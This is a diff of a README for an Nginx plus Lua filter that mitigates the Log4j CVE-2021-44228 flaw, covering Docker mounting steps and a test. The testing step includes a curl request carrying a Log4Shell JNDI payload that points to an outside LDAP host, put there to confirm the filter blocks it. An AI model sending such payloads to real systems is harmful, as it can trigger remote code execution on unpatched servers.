@@ -1,10 +1,12 @@
 
 # nginx-lua
-This repository contains the configuration for the mitigation of Log4j vulnerabilities in the JAVA applications. Nginx, with the help of lua module, will prevent the attacker to access vulnerable JAVA application
+This repository contains the configuration for the mitigation of Log4j vulnerabilities in the JAVA applications. Nginx, with the help of lua module, will prevent the attacker to access vulnerable JAVA application.
+Special thanks to [John H Patton
+](https://johnhpatton.medium.com/) for the motivation to extend the solution he wrote to mitigate the Log4j vulnerability.
 
 
 ## Description
-This implementation will provide a quick fix for the vulnerability [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). Expertflow latest release is not vulnerable to this vulnerability and we recommend you to update to the latest release. However, this is also one way to mitigate the risk of remote code execution with the help of Nginx + lua module. After this implementation, each request will be inspected by Nginx and if the request has exploit to remotely execute the code in either its header or in the body, the request will be dropped and won't make its way to the internal Expertflow application. 
+This implementation will provide a quick fix for the vulnerability [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). Expertflow latest release is not vulnerable to this vulnerability and we recommend you to update to the latest release. However, this is also one way to mitigate the risk of remote code execution with the help of Nginx + lua module. After this implementation, each request will be inspected by Nginx and if the request has exploit to remotely execute the code in either its header or in the body, the request will be dropped and won't make its way to the internal application.
 
 
 ## Requirements
@@ -12,39 +14,46 @@ This implementation will provide a quick fix for the vulnerability [CVE-2021-442
 2. Update the `nginx.conf` file
 3. Clone and mount the `nginx-lua.conf` `lua.conf`, and `cve_2021_44228.lua` files to your nginx container.
 
+We assume that the nginx is deployed in Docker throughout the document.
+
 
 
 
 ## Implementation Steps
-1. Clone and copy the `nginx-lua.conf`, `lua.conf`, and `cve_2021_44228.lua` ,  in the `/path/to/release/docker/nginx/`
-2. Update the `/path/to/release/docker/nginx/https-singleton.conf` file. Add the following code in `https-singleton.conf`
+1. Clone and copy the `nginx-lua.conf`, `https-lua.conf`, `lua.conf`, and `cve_2021_44228.lua` ,  in the `/path/to/nginx_volume_mount/`. 
+For example if you have deployed nginx in Docker then there must be a section present called `Volumes:` in your docker-compose. For example:
 ```
-############## lua conf################
-    set $captured_request_headers "";
-    set $captured_request_body "";
-    set $cve_2021_44228_log "";
-    rewrite_by_lua_block {
-        cve_2021_44228.block_cve_2021_44228()
+volumes:
+      - /path/to/nginx_volume_mount/https.conf:/etc/nginx/conf.d/https.conf
+```
 
- }
-###########################################
-````
-3. Now we need to update the `/path/to/release/active/docker-compose-service-gateway.yml` file. 
+This is mounting a custom `https.conf` file to the build-in nginx `https.conf` file present under the directory: `/etc/nginx/conf.d/` in nginx container.
+
+2. Now we need to modify `https.conf`. Update the `/path/to/nginx_volume_mount/https.conf` file by adding the following code in `https.conf`
+
+```
+include /etc/nginx/https-lua.conf
+```
+
+
+
+4. Now we need to update the `docker-compose.yml` file of the nignx. 
 - Update the `image:` entry with the `expertflow/nginx-lua:debian-1.21.4`
 - Navigate to the `volume:` section and mount these files to docker container by adding the following code:
 ```
     volumes:
-      - /path/to/release/docker/nginx/https-singleton.conf:/etc/nginx/conf.d/https.conf
-      - /path/to/release/docker/nginx/nginx-lua.conf:/etc/nginx/nginx.conf
-      - /path/to/release/docker/nginx/cve_2021_44228.lua:/usr/local/lib/lua/cve_2021_44228.lua
-      - /path/to/release/docker/nginx/lua.conf:/etc/nginx/conf.d/lua.conf
+      - /path/to/nginx_volume_mount/https.conf:/etc/nginx/conf.d/https.conf
+      - /path/to/nginx_volume_mount/https-lua.conf:/etc/nginx/https-lua.conf
+      - /path/to/nginx_volume_mount/nginx-lua.conf:/etc/nginx/nginx.conf
+      - /path/to/nginx_volume_mount/cve_2021_44228.lua:/usr/local/lib/lua/cve_2021_44228.lua
+      - /path/to/nginx_volume_mount/lua.conf:/etc/nginx/conf.d/lua.conf
 ```
-4. Now just remove the nginx container and start it again. 
+5. Now just remove the nginx container and start it again. 
 
 ### Testing
 We can now test our implementation whether it's blocking the exploit in the request or not. To test it, send the following request with the exploit present in the header and body with `curl`. Just replace the string `<FQDN>` with your FQDN.
 ```
-curl --location --request POST 'https://<FQDN>/ccm/360notifications' \
+curl --location --request POST 'https://<FQDN>/uri' \
 --header 'efheader: ${jndi:ldap://8.8.4.4:1111/RCE/Command}' \
 --header 'Content-Type: application/json' \
 --data '{
